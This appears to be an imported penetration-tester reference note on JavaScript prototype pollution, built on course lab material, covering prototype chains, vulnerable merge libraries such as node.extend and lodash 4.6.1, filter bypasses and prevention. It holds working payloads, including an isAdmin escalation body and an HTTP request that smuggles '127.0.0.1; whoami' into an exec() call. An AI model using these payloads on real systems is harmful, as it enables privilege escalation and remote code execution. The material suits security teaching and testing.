---
technique: "Prototype Pollution"
family: "client-side"
severity_hint: "critical"
tags: ["JavaScript", "Account Takeover", "XSS", "403", "Remote Code Execution", "HTTP", "JS"]
source: "_raw/Web attacks/Web Attacks/Prototype Pollution.md"
curator_version: 2
review_status: imported-unreviewed
---

# Prototype Pollution

> Family: **client-side** · Severity hint: **critical** · Tags: JavaScript, Account Takeover, XSS, 403, Remote Code Execution, HTTP, JS
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Overview

<aside>
💡

⚠️ PP can break the whole web page, be carefull on live targets!

Check the loaded libraries, then check if we can find a PP for the loaded version. We can then check via the console `Object.prototype` if the PP was successful. We can then search for gadgets that result in XSS for those libs.

</aside>

Prototype pollution occurs when an attacker manages to add or override properties on a JavaScript object's prototype (most often the base `Object.prototype`) when this isn't intended by the developer. Since practically every object in a JS runtime inherits from `Object.prototype` somewhere up its prototype chain, a single injected property can ripple through the whole application — flipping logic that checks for a property's existence, shadowing built-in methods (`toString`, etc.), or feeding into a later sink that leads to XSS or RCE. Because it can arise from many different code patterns (not just one obvious sink), it's usually found via vulnerable dependencies (merge/clone/extend libraries) rather than a single grep-able keyword.

A minimal illustration: overriding a method on the prototype directly propagates to every object that inherits from it —

```jsx
module.__proto__.toString = function () {return "shadowed";}
```

— and since `webAttacks = new Module(...)` inherits two steps up its chain to `Object.prototype`, walking up that chain lets us modify or create arbitrary global properties:

```jsx
function Module(name, author, tier) {
	this.name = name;
	this.author = author;
	this.tier = tier;
}

var webAttacks = new Module("Web Attacks", "21y4d", 2)
```

```jsx
webAttacks.__proto__.__proto__.academy = "polluted";
```

The vulnerability typically surfaces through a recursive merge helper. A web application accepting JSON user input for comments —

```jsx
{"comment": "Great module."}
```

— sets the `comment` property on a `module` object. To support arbitrary keys generically, a developer might implement a recursive merge instead of hardcoding property names:

```jsx
// helper to determine if recursion is required
function isObject(obj) {
	return typeof obj === 'function' || typeof obj === 'object';
}

// merge source with target
function merge(target, source) {
	for (let key in source) {
		if (isObject(target[key]) && isObject(source[key])) {
			merge(target[key], source[key]);
		} else {
			target[key] = source[key];
		}
	}
	return target;
}
```

This works fine for the intended case, but because the merge recurses on any key — including `__proto__` — a JSON payload containing that keyword pollutes the prototype:

```jsx
{"__proto__": {"poc": "pwned"}}
```

This happens because `target[key] = source[key]` becomes `module["__proto__"]["poc"] = "pwned"`, which is equivalent to `module.__proto__.poc = "pwned"`.

Useful references: `Whitebox_Attacks_Module_Cheat_Sheet.pdf`, and the [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution#prototype-pollution) repo ([jquery-deparam gadget](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/jquery-deparam.md), [recaptcha gadget](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/recaptcha.md), [gadgets index](https://github.com/BlackFan/client-side-prototype-pollution/tree/master/gadgets)).

## JS Objects & Prototypes

### Objects in JavaScript

Objects bundle multiple datatypes together as `properties`, e.g. `module = { name: "Web Attacks", author: "21y4d", tier: 2 }` is an object with `name`/`author`/`tier` properties. Properties are accessed via dot notation (`module.name`) and new ones can be added the same way (`module.propertie = data`) — including functions or other objects as values.

### Prototypes in JavaScript

A pre-defined "template" of inheritance is always applied to existing objects to provide basic functionality, implemented via [Object prototypes](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/Object_prototypes). The prototype of an object is a reference to another object it inherits from; since that prototype itself has a prototype, this forms the `prototype chain`:

```jsx
>> module.toString()

"[object Object]"
```

`module` inherits `toString()` from its prototype, which is `Object.prototype` — the base prototype that every created object ultimately inherits from. If a property lookup misses on the object itself, the prototype is searched, then the prototype's prototype, and so on; if the whole chain comes up empty, `undefined` is returned.

Properties can be overridden to implement custom behavior — this is called `shadowing`:

```jsx
module.toString = function() {return "This is the HTB Academy module: " + this.name;}
```

## Privilege Escalation

### Code Review — Identifying the Vulnerability

Because prototype pollution can arise from many different implementations, source code can't just be grepped for a fixed keyword. A lot of PP comes from vulnerable dependencies — often functions that clone or merge JS objects. Run `npm audit report`, and check any interesting-sounding merging libs (e.g. `node.extend`) for CVEs. Then confirm user input actually reaches the vulnerable dependency call — first find where the dependency is used:

```jsx
grep -rl "node.extend"

utils/log.js
package.json
```

```jsx
// utils/log.js

const extend = require("node.extend");

const log = (request) => {
	var log = extend(true, {date: Date.now()}, request);
	console.log("## Login activity: " + JSON.stringify(log));
}

module.exports = { log };
```

`utils/log.js` exports a `log` function that merges the current date with the caller-supplied `request` argument using the vulnerable `node.extend`. Next, trace what calls `log`:

```jsx
grep -rl " log("

routes/index.js
```

```jsx
router.post("/login", async (req, res) => {
	// log all login attempts for security purposes
    log(req.body);
	
	<SNIP>
}
```

`log` is called with `req.body` directly, so a login request carrying a prototype-pollution payload reaches `node.extend` unfiltered.

<aside>
👉🏽

Polluting the global `Object.prototype` affects all objects in the target JavaScript runtime context and thus might result in unexpected and undesired consequences. Therefore, it is preferable to pollute objects lower down in the prototype chain so that not all JavaScript objects are affected by the pollution.

</aside>

### Example: node.extend

The vulnerable merge logic inside `node.extend` recurses into nested plain objects/arrays without excluding `__proto__`:

```jsx
for (; i < length; i++) {
    // Only deal with non-null/undefined values
    options = arguments[i];
    if (options != null) {
      if (typeof options === 'string') {
        options = options.split('');
      }
      // Extend the base object
      for (name in options) {
        src = target[name];
        copy = options[name];

        // Prevent never-ending loop
        if (target === copy) {
          continue;
        }

        // Recurse if we're merging plain objects or arrays
        if (deep && copy && (is.hash(copy) || (copyIsArray = is.array(copy)))) {
          if (copyIsArray) {
            copyIsArray = false;
            clone = src && is.array(src) ? src : [];
          } else {
            clone = src && is.hash(src) ? src : {};
          }

          // Never move original objects, clone them
          target[name] = extend(deep, clone, copy);

        // Don't bring in undefined values
        } else if (typeof copy !== 'undefined') {
          target[name] = copy;
        }
      }
    }
```

```jsx
const log = (request) => {
    var log = extend(true, {date: Date.now()}, request);
    console.log("## Login activity: " + JSON.stringify(log));
}
```

```jsx
router.post("/login", ...)
	 log(req.body);
```

Since the merge result is never used to gate authorization here directly, the practical escalation payload targets a property consumed elsewhere in the app (e.g. `isAdmin`):

```jsx
{
	"username":"X",
	"password":"X",
	"__proto__": {
		"isAdmin":true
		}
}
```

See [SNYK-JS-LODASHMERGE-173732](https://security.snyk.io/vuln/SNYK-JS-LODASHMERGE-173732) for the equivalent issue in `lodash.merge`.

## RCE

### Code Review — Identifying the Vulnerability

```jsx
// ping device IP
router.get("/ping", AuthMiddleware, async (req, res) => {
    try {
        const sessionCookie = req.cookies.session;
        const username = jwt.verify(sessionCookie, tokenKey).username;

        // create User object
        let userObject = new User(username);
        await userObject.init();

        if (!userObject.deviceIP) {
            return res.status(400).send(response("Please configure your device IP first!"));
        }

        exec(`ping -c 1 ${userObject.deviceIP}`, (error, stdout, stderr) => {
            return res.render("ping", { ping_result: stdout.replace(/\n/g, "<br/>") + stderr.replace(/\n/g, "<br/>") });
        });

    } 
    <SNIP>
});
```

`/ping` execs a shell command built from `userObject.deviceIP`. That property is normally set from the database, but it's also settable via the profile-update endpoint, which merges the raw request body into the user object with `lodash`:

```jsx
// update user profile
router.post("/update", AuthMiddleware, async (req, res) => {
    try {
        const sessionCookie = req.cookies.session;
        const username = jwt.verify(sessionCookie, tokenKey).username;

        // sanitize to avoid command injection
        if (req.body.deviceIP){
            if (req.body.deviceIP.match(/[^a-zA-Z0-9\.]/)) {
                return res.status(400).send(response("Invalid Characters in DeviceIP!"));
            }
        }

        // create User object
        let userObject = new User(username);
        await userObject.init();

        // merge User object with updated properties
        _.merge(userObject, req.body); //library lodash in version 4.6.1
		
        // update DB
        await userObject.writeToDB();

        return res.status(200).send(response("Successfully updated User!"));

    }
    <SNIP>
});
```

The `deviceIP` field itself is validated against a strict `[a-zA-Z0-9.]` allowlist — but that check only fires when `req.body.deviceIP` is set directly, not when it's introduced via `__proto__`, and `_.merge` (lodash 4.6.1) is a known-vulnerable merge that recurses into `__proto__` ([SNYK-JS-LODASHMERGE-173732](https://security.snyk.io/vuln/SNYK-JS-LODASHMERGE-173732)):

The `User` class copies every non-null property from the DB row onto `this`, and later writes every non-null instance property back to the DB — so a prototype-polluted property flows straight through:

```jsx
// custom User class
class User {
    constructor(username) {
        this.username = username;
    }
    
    // initialize User object from DB
    async init() {
        const dbUser = await db.Users.findOne({ where: { username: this.username }});

        if (!dbUser){ return; }

        // set all non-null properties
        for (const property in dbUser.dataValues) {
            if (!dbUser[property]) { continue; }

            this[property] = dbUser[property];
        } 
    }

    async writeToDB() {
        const dbUser = await db.Users.findOne({ where: {username: this.username} });
        
        // update all non-null properties
        for (const property in this) {
            if (!this[property]) { continue; }

            dbUser[property] = this[property];
        }

        await dbUser.save();
    }
}
```

```jsx
router.post("/register", async (req, res) => {
    try {
        const username = req.body.username;
        const password = req.body.password;

        <SNIP>

        await db.Users.create({
            username: username,
            password: bcrypt.hashSync(password)
        }).then(() => {
            res.send(response("User registered successfully"));
        });
    } catch (error) {
        console.error(error);
        res.status(500).send({
            error: "Something went wrong!",
        });
    }
});
```

A newly registered user has no `deviceIP` property (it's `null` in the DB, so `init()` skips setting it on the instance). Pollute `Object.prototype.deviceIP` via `/update`, and the later `/ping` route's `userObject.deviceIP` check (a normal property lookup, which falls through to the prototype) picks up the polluted value — landing straight in the unsanitized `exec()` call for command injection:

```jsx
POST /update HTTP/1.1
Host: proto.htb
Content-Length: 48
Content-Type: application/json
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InB3biIsImlhdCI6MTY4MTA3MjgxMCwiZXhwIjoxNjgxMDc2NDEwfQ.q1dbloU9k06dAymKHXvMvVrpEeYWRXABx9sK7qG6CWg

{"__proto__":{"deviceIP":"127.0.0.1; whoami"}}
```

## Filter Bypasses

### Other ways to call `__proto__`

If the literal key `__proto__` is filtered, use the object's [`constructor`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor) instead. Every JS object has a `constructor` property referencing the function that created it, and that constructor's `prototype` property points at the same object as `__proto__` — i.e. `test.constructor.prototype` is equivalent to `test.__proto__`. `x.constructor.__proto__.__proto__` also works for reaching further up the chain.

<aside>
👉🏽

When using dot notation JS will treat it as a single property `constructor.prototype` does not work, it has to be encapsulated `{"constructor": {"prototype": ..`

</aside>

```jsx
{
  "constructor": {
    "prototype": {
      "deviceIP": "127.0.0.1; whoami"
    }
  }
}
```

## Remarks

### Checking PP as Safely as Possible

**Status Code** — the first and most universal technique is manipulating the status code returned when the application errors. First check how the app responds to an invalid JSON body (baseline, e.g. `400`), then pollute the `status` property on `Object.prototype`:

```jsx
{
	"__proto__":{
		"status":555
	}
}
```

If PP worked, the server now returns the custom status code `555` on the next request — possibly after traversing multiple steps up the prototype chain depending on the app's implementation.

**Parameter Limiting** — requires an endpoint that reflects GET parameters somehow (e.g. echoes them back in a JSON body). Pollute `parameterLimit` on `Object.prototype`:

```json
{
	"__proto__":{
		"parameterLimit":1
	}
}
```

If PP worked, the app now reflects only the first GET parameter, silently dropping the rest.

**Content-Type** — also requires reflection of a JSON object. Force the app to accept a different encoding without breaking it, e.g. `UTF-7` (doesn't clash with the default `UTF-8`). Encode a test string first:

```bash
$ echo -n 'HelloWorld!!!' | iconv -f UTF-8 -t UTF-7HelloWorld+ACEAIQAh-
```

Then pollute `content-type` on `Object.prototype`:

```json
{
	"__proto__":{
		"content-type":"application/json; charset=utf-7"
	}
}
```

### Prevention & Patching

Blocking only the literal key `__proto__` is insufficient — the constructor/prototype route (see Filter Bypasses) bypasses that. A more robust approach is a whitelist of explicitly allowed keys, chosen carefully per context; this can also help mitigate related issues like [Mass Assignment](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment).

`Object.freeze()` on the global `Object.prototype` prevents any further modification to it, which blocks pollution of the base prototype — but it's not a universal fix. The RCE case above polluted `User.prototype`, not `Object.prototype`, so freezing only the base object wouldn't have stopped it; the specific prototype in the vulnerable path (`User.prototype`) would need freezing too.

`Object.create(null)` creates an object with prototype `null`, so it has no inherited properties at all and can't be polluted — but it also loses useful inherited properties like `toString()`, which makes it impractical for many real use cases.

Ultimately, prototype pollution arises from recursively manipulating object properties using user input, most often via a third-party merge/clone/extend library — so patching is often just a matter of using secure, up-to-date libraries. [nopp](https://github.com/snyk-labs/nopp) is a package that can help enforce some of these defenses automatically.

## Source
- `_raw/Web attacks/Web Attacks/Prototype Pollution.md`
- `_raw/Web attacks/Web Attacks/Prototype Pollution/Introduction to Prototype Pollution.md`
- `_raw/Web attacks/Web Attacks/Prototype Pollution/JavaScript Objects & Prototypes.md`
- `_raw/Web attacks/Web Attacks/Prototype Pollution/Privilege Escalation.md`
- `_raw/Web attacks/Web Attacks/Prototype Pollution/Remote Code Execution.md`
- `_raw/Web attacks/Web Attacks/Prototype Pollution/Filter Bypasses.md`
- `_raw/Web attacks/Web Attacks/Prototype Pollution/Remarks.md`
